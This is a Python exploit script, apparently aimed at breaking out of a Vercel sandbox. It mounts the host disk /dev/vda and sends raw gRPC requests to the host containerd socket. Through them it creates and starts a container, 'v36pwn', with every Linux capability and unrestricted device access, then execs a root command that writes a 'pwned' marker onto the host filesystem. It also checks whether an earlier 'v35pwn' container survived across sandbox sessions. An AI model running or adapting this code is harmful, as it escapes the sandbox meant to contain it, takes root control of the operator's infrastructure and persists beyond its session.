# -*- coding: utf-8 -*-
"""vda36_ctrd_create3: 修复 devices + 检查 v35pwn 残留 + 标准 Exec
P1: Containers/List (检查 v35pwn 跨会话残留!) + snap key
P2: Containers/Create v36pwn (spec 带 linux.devices: null/zero/full/random/urandom/tty)
P3: Tasks/Create + Tasks/Start
P4: 验证 (init.pid / Tasks/List / task 目录)
P5: Tasks/Exec 标准布局 (ExecProcessRequest: cid=1 execid=2 spec=3 bools=4-7) 写 cell rootfs marker
P6: marker 验证
输出落盘 + 哨兵 V36S_DONE"""
import os, time, socket, ctypes, re, struct, subprocess, json, base64

OUT = '/vercel/sandbox/v36s.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, ctype='application/grpc', t=7, ns='default', headers=None):
    try:
        tmp = '/vercel/sandbox/curl_req_%d.bin' % os.getpid()
        hdr = '/vercel/sandbox/curl_hdr_%d.txt' % os.getpid()
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: %s' % ctype, '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        if headers:
            for h in headers:
                cmd += ['-H', h]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 3)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' | ')[:250]
        except Exception:
            pass
        return 'rc=%d HDR:%s' % (r.returncode, hdrtxt), r.stdout
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pvarint(n):
    out = bytearray()
    while n > 127:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def pstr(field_no, s):
    b = s.encode() if isinstance(s, str) else s
    return pvarint((field_no << 3) | 2) + pvarint(len(b)) + b


def pmsg(field_no, payload):
    return pvarint((field_no << 3) | 2) + pvarint(len(payload)) + payload


def pbool(field_no, v):
    return pvarint((field_no << 3)) + (b'\x01' if v else b'\x00')


def show(tag, out, raw=False):
    if not out:
        log('%s -> EMPTY' % tag)
        return
    if raw:
        log('%s -> %s' % (tag, out[:400].decode('utf-8', errors='replace').replace('\n', ' ')))
        return
    strs = re.findall(rb'[\x20-\x7e]{4,}', out)
    log('%s -> %s' % (tag, [s.decode(errors='replace') for s in strs[:20]]))


CSP = '/mnt/vdax/run/containerd/containerd.sock'
IMAGE = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
CID = 'v36pwn'

DEVS = [
    {"path": "/dev/null", "type": "c", "major": 1, "minor": 3, "fileMode": 438, "uid": 0, "gid": 0},
    {"path": "/dev/zero", "type": "c", "major": 1, "minor": 5, "fileMode": 438, "uid": 0, "gid": 0},
    {"path": "/dev/full", "type": "c", "major": 1, "minor": 7, "fileMode": 438, "uid": 0, "gid": 0},
    {"path": "/dev/random", "type": "c", "major": 1, "minor": 8, "fileMode": 438, "uid": 0, "gid": 0},
    {"path": "/dev/urandom", "type": "c", "major": 1, "minor": 9, "fileMode": 438, "uid": 0, "gid": 0},
    {"path": "/dev/tty", "type": "c", "major": 5, "minor": 0, "fileMode": 438, "uid": 0, "gid": 0},
]


def make_spec(args):
    caps = ["CAP_AUDIT_CONTROL", "CAP_AUDIT_READ", "CAP_AUDIT_WRITE", "CAP_BLOCK_SUSPEND", "CAP_BPF",
            "CAP_CHECKPOINT_RESTORE", "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER",
            "CAP_FSETID", "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_KILL", "CAP_LEASE", "CAP_LINUX_IMMUTABLE",
            "CAP_MAC_ADMIN", "CAP_MAC_OVERRIDE", "CAP_MKNOD", "CAP_NET_ADMIN", "CAP_NET_BIND_SERVICE",
            "CAP_NET_BROADCAST", "CAP_NET_RAW", "CAP_PERFMON", "CAP_SETFCAP", "CAP_SETGID", "CAP_SETPCAP",
            "CAP_SETUID", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_CHROOT", "CAP_SYS_MODULE", "CAP_SYS_NICE",
            "CAP_SYS_PACCT", "CAP_SYS_PTRACE", "CAP_SYS_RAWIO", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
            "CAP_SYS_TTY_CONFIG", "CAP_SYSLOG", "CAP_WAKE_ALARM"]
    return {
        "ociVersion": "1.0.2",
        "process": {
            "user": {"uid": 0, "gid": 0},
            "args": args,
            "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                    "V36_PWNED=1"],
            "cwd": "/",
            "capabilities": {
                "bounding": caps, "effective": caps, "permitted": caps, "ambient": caps
            }
        },
        "root": {"path": "rootfs"},
        "mounts": [
            {"destination": "/proc", "type": "proc", "source": "proc"},
            {"destination": "/dev", "type": "tmpfs", "source": "tmpfs",
             "options": ["nosuid", "noexec", "nodev", "mode=755"]}
        ],
        "linux": {
            "devices": DEVS,
            "resources": {"devices": [{"allow": True, "access": "rwm"}]},
            "cgroupsPath": "/v36pwn-ctr",
            "namespaces": [
                {"type": "mount"}, {"type": "pid"}, {"type": "uts"}, {"type": "ipc"}
            ]
        }
    }


def p1():
    log('=== P1 list + v35pwn residue check ===')
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
    log('Containers/List %s' % rc)
    show('Containers body', out)
    if b'v35pwn' in out:
        log('*** V35PWN PERSISTED ACROSS SANDBOX SESSIONS ***')
    if b'v36pwn' in out:
        log('v36pwn already exists')
    m = re.search(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}-snapshot', out)
    sk = m.group().decode() if m else None
    log('snap_key=%s' % sk)
    return sk


def p2(sk):
    log('=== P2 Containers/Create ===')
    spec = make_spec(["/bin/sh", "-c", "sleep 99999"])
    spec_json = json.dumps(spec).encode()
    runtime = pstr(1, 'io.containerd.runc.v2')
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, spec_json)
    ctr = pstr(1, CID) + pstr(3, IMAGE) + pmsg(4, runtime) + pmsg(5, any_spec)
    ctr += pstr(6, 'overlayfs')
    if sk:
        ctr += pstr(7, sk)
    req = pmsg(1, ctr)
    log('Create req len=%d' % len(req))
    rc, out = curl_h2(CSP, '/containerd.services.containers.v1.Containers/Create', grpc_env(req), t=7)
    log('Containers/Create %s' % rc)
    show('Create body', out, raw=True)
    return 'grpc-status: 0' in rc


def p3():
    log('=== P3 Tasks/Create+Start ===')
    req = pstr(1, CID)
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(req), t=8)
    log('Tasks/Create %s' % rc)
    show('CreateTask body', out, raw=True)
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Start', grpc_env(req), t=8)
    log('Tasks/Start %s' % rc)
    show('Start body', out, raw=True)


def p4():
    log('=== P4 verify ===')
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/List', grpc_env(b''), t=4)
    log('Tasks/List %s' % rc)
    show('Tasks body', out)
    td = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default/%s' % CID
    try:
        log('task dir: %s' % sorted(os.listdir(td)))
        for fn in ['init.pid', 'config.json']:
            fp = os.path.join(td, fn)
            try:
                if fn == 'init.pid':
                    log('init.pid: %s' % open(fp).read().strip())
                else:
                    head = open(fp, 'rb').read(800).decode('utf-8', errors='replace')
                    log('config head: %s' % head[:400].replace('\n', ' '))
            except Exception as e:
                log('%s ERR %s' % (fn, e))
    except Exception as e:
        log('task dir ERR %s' % e)


def p5():
    log('=== P5 Tasks/Exec ===')
    # ExecProcessRequest: container_id=1 exec_id=2 spec=3(Process Any) stdin=4 stdout=5 stderr=6 terminal=7
    proc = {
        "user": {"uid": 0, "gid": 0},
        "args": ["/bin/sh", "-c",
                 "mount /dev/vda /mnt 2>/dev/null; echo v36-exec-pwned > /mnt/root/.v36_exec_marker 2>/dev/null; sleep 2"],
        "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
        "cwd": "/",
        "capabilities": {
            "bounding": ["CAP_SYS_ADMIN", "CAP_MKNOD", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_SYS_PTRACE", "CAP_NET_ADMIN", "CAP_NET_RAW"],
            "effective": ["CAP_SYS_ADMIN", "CAP_MKNOD", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_SYS_PTRACE", "CAP_NET_ADMIN", "CAP_NET_RAW"],
            "permitted": ["CAP_SYS_ADMIN", "CAP_MKNOD", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_SYS_PTRACE", "CAP_NET_ADMIN", "CAP_NET_RAW"],
            "ambient": ["CAP_SYS_ADMIN", "CAP_MKNOD", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_SYS_PTRACE", "CAP_NET_ADMIN", "CAP_NET_RAW"]
        }
    }
    proc_json = json.dumps(proc).encode()
    any_spec = pstr(1, 'types.containerd.io/opencontainers/runtime-spec/1/Spec') + pstr(2, proc_json)
    req = pstr(1, CID) + pstr(2, 'v36exec1') + pmsg(3, any_spec)
    req += pbool(4, True) + pbool(5, True) + pbool(6, True) + pbool(7, False)
    log('Exec req len=%d' % len(req))
    rc, out = curl_h2(CSP, '/containerd.services.tasks.v1.Tasks/Exec', grpc_env(req), t=8)
    log('Tasks/Exec %s' % rc)
    show('Exec body', out, raw=True)
    time.sleep(3)
    try:
        mk = '/mnt/vdax/root/.v36_exec_marker'
        log('exec marker exists: %s' % os.path.exists(mk))
        if os.path.exists(mk):
            log('exec marker content: %s' % open(mk).read().strip())
    except Exception as e:
        log('marker chk ERR %s' % e)


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sk = p1()
    ok = p2(sk)
    if ok:
        p3()
        p4()
        p5()
    else:
        log('CREATE FAILED')

    log('V36S_DONE')
    f.close()


if __name__ == '__main__':
    main()
